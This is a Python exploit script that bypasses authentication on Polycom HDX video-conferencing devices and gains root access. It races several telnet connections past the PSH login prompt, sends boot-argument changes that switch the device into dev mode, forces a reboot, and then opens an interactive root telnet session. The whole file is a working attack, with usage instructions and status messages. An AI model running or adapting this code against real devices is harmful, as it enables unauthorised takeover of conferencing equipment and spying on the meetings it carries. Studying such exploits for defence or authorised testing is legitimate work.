#!/usr/bin/env python
# Copyright (c) 2007-2015 DSquare Security, LLC

# Credits to Paul Haas <Paul dot Haas at Security-Assessment dot com> for a
# big part of the code.

###
# STD
###
import sys,socket,time,threading,readline

PORT = 23 # Default service port
THREADS = 6 # Best results vary from 4-8
BUF = 9200 # For sock.recv buffer
WAIT = 0.5 # For time.sleep between sock.send and sock.recv
SHELL = False # Lock shell to a single thread in bypass function

def check(host, port):
  '''Check for server banner of vulnerable Polycom PSH shell'''
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((host, port))
  sock.send('hello\n')
  time.sleep(WAIT)
  data = sock.recv(BUF).strip()
  sock.close()
  #if 'Welcome to ViewStation' not in data:
  # print "[Did not match banner information on %s:%i]: %s" % (host,port,data)
  # exit(2)
  return 0

def bypass(host, port):
  '''Loop socket connection until login prompt is bypassed'''
  global SHELL
  while not SHELL:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send('whoami\n')
    data = sock.recv(BUF)
    while data:
      if SHELL: break
      elif 'Polycom' in data:
        SHELL = True
        print "[+] Bypass attack succeeded, setting on devmode and reboot"
        while data:
          #print data.strip()
          #echo = raw_input("-> ")
          #try: sock.send("%s\n" % echo)
          try: sock.send('setenv othbootargs "devboot=bogus"\nreboot\n')
          except socket.error: break
          time.sleep(WAIT)
          data = sock.recv(BUF)
          try: sock.send('y\n')
          except socket.error: break
          time.sleep(WAIT)
          data = sock.recv(BUF)
          #print data.strip()
        print "[+] Connection closed"
      elif 'bind' in data:
        #print data.strip()
        sock.send('whoami\n')
      elif 'failed' in data:
        break
      data = sock.recv(BUF)
    sock.close()
    return 0

def telnetroot(host, port):
  print "[+] Spwaning a true root shell, not a Polycom shell (psh)"
  print "[+] To logout, setting on prodmode with this command: '/opt/polycom/bin/devconvert normal'"
  print "[+] The box will reboot automatically"
  import pexpect
  child=pexpect.spawn('telnet %s'%host)
  child.expect('ogin: ');
  child.sendline('root');
  try:
    child.interact()
    sys.exit(0)
  except:
    sys.exit(1)


if __name__ == '__main__':
 if len(sys.argv) <= 1:
  print __doc__
  print "Usage: %s [HOST] {PORT=%i} {THREADS=%s}" % (sys.argv[0],PORT,THREADS)
  exit(1)
 host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
 port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
 thread = int(sys.argv[3]) if len(sys.argv) > 3 else THREADS

 check(host,port)

 print "[+] Running attack against %s:%i using %i threads" % (host,port,thread)
 print "[+] Look for 'Socket bind error' messages, bypass may take time"

 threads = [threading.Thread(target=bypass, args=(host,port,)) for i in range(thread)]
 [t.start() for t in threads]
 [t.join() for t in threads]

 print "[+] Wait 60s that Polycom HDX box reboot"
 time.sleep(60)  
 telnetroot(host, port)

